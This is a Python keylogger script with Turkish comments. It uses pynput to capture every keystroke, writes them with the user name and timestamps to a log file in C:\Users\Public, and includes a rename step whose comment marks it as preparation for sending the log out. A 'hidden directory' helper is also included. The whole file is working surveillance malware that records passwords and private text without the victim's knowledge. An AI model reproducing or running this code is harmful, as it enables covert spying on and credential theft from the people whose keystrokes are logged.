from pynput.keyboard import Key, Listener
from getpass import getuser
from datetime import datetime
import os
import threading
import sys
import locale
import datetime
if sys.platform == 'win32':
    locale.setlocale(locale.LC_ALL, 'tr_TR')
else:
    locale.setlocale(locale.LC_ALL, 'tr_TR.UTF-8')

def KeyConMin(argument):  # Ortak Karakterler // Optimize Edildi
    switcher = {
        "'a'": "a", "'e'": "e", "'i'": "i", "'o'": "o", "'u'": "u", "'b'": "b", "'c'": "c", "'d'": "d", "'f'": "f",
        "'g'": "g", "'h'": "h", "'ş'": "ş", "'ı'": "ı", "'ö'": "ö", "'ü'": "ü", "'ç'": "ç", "'j'": "j", "'J'": "J", "'k'": "k", "'l'": "l", "'m'": "m", "'n'": "n", "'ñ'": "ñ",
        "'p'": "p", "'q'": "q", "'r'": "r", "'s'": "s", "'t'": "t", "'v'": "v", "'w'": "w", "'x'": "x", "'y'": "y",
        "'z'": "z", "','": ",", "'.'": ".", "'_'": "_", "'-'": "-", "':'": ":", "'A'": "A", "'E'": "E", "'I'": "I",
        "'O'": "O", "'U'": "U", "'B'": "B", "'C'": "C", "'D'": "D", "'F'": "F", "'G'": "G", "'H'": "Ş", "'Ş'": "H","'K'": "K",
        "'L'": "L", "'M'": "M", "'N'": "N", "'Ñ'": "Ñ", "'P'": "P", "'Q'": "Q", "'R'": "R", "'S'": "S", "'T'": "T",
        "'V'": "V", "'W'": "W", "'X'": "X", "'Y'": "Y", "'Z'": "Z", "'1'": "1", "'2'": "2", "'3'": "3", "'4'": "4",
        "'5'": "5", "'6'": "6", "'7'": "7", "'8'": "8", "'9'": "9", "'0'": "0", "'@'": "@", "'#'": "#", "'*'": "*",
        "'('": "(", "')'": ")", "'?'": "?", "'='": "=", "'+'": "+", "'!'": "!", "'}'": "}", "'{'": "{", "'´'": "´",
        "'|'": "|", "'°'": "°", "'^'": "¬", "';'": ";", "'$'": "$", "'%'": "%", "'&'": "&", "'>'": ">", "'<'": "<",
        "'/'": "/", "'¿'": "¿", "'¡'": "¡", "'~'": "~"
    }
    return switcher.get(argument, "")

def KeyConMax(argument):
    switcher = {
        "Key.space": " ", "Key.backspace": "«", "Key.enter": "\r\n", "Key.tab": "    ", "Key.delete": " «×» ",
        "<96>": "0", "<97>": "1", "<98>": "2", "<99>": "3", "<100>": "4", "<101>": "5", "<102>": "6", "<103>": "7",
        "<104>": "8", "<105>": "9", "None<96>": "0", "None<97>": "1", "None<98>": "2", "None<99>": "3",
        "None<100>": "4", "None<101>": "5", "None<102>": "6", "None<103>": "7", "None<104>": "8", "None<105>": "9",
        "['^']": "^", "['`']": "`", "['¨']": "¨", "['´']": "´", "<110>": ".", "None<110>": ".",
        "Key.alt_l": " [Alt L] ", "Key.alt_r": " [Alt R] ", "Key.ctrl_r": " [Control R] ",
        "Key.ctrl_l": " [Control L] ", "Key.right": " [Right] ", "Key.left": " [Left] ", "Key.up": " [Up]",
        "Key.down": " [Down] ", "Key.caps_lock": " [Caps lock] ", "Key.cmd": " [Windows] "

    }
    return switcher.get(argument, "")

# log.txt kaydetme
def Klogger():
    try:
        log = os.environ.get(
            'pylogger_file',
            os.path.expanduser('C:\\Users\\Public\\log.txt')
        )

        T = datetime.datetime.now()
        getTime = "Tarih:      [" + T.strftime("%A") + " " + T.strftime("%d") + " " + T.strftime(
            "%B") + "]\nSaat:       [" + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime(
            "%p") + "]\n"

        with open(log, "a") as f:
            f.write("\n--------------------------------------------\nKullanıcı:  [" + str(getuser()) + "]\n" + str(
                getTime) + "--------------------------------------------\n\n")
    except:  # Dosyayı oluşturamazsa, eksik dizini oluştur
        CreateDir()  # Klasörü oluştur

    def on_press(key):
        with open(log, "a") as f:
            if (len(str(key))) <= 3:
                print(KeyConMin(str(key)))
                f.write(KeyConMin(str(key)))
            else:
                print(KeyConMax(str(key)))
                f.write(KeyConMax(str(key)))

    with Listener(on_press=on_press) as listener:  # Tuş vuruşlarını dinleme
        listener.join()

# Gönderilmeden önce günlük dosyasını yeniden adlandırma
def Rename(name):
    try:
        CreateDir()
        # Dosyayı kopyalama işi
        pathO = "C:\\Users\\Public\\log.txt"
        pathN = "C:\\Users\\Public\\" + name + ".txt"
        os.rename(pathO, pathN)
    except:
        pass

# Gizli dizini oluştur
def CreateDir():
    try:
        os.makedirs('C:\\Users\\Public')
    except:
        pass

if __name__ == '__main__':
    p1 = threading.Thread(target=Klogger)
    p1.start()
    p1.join()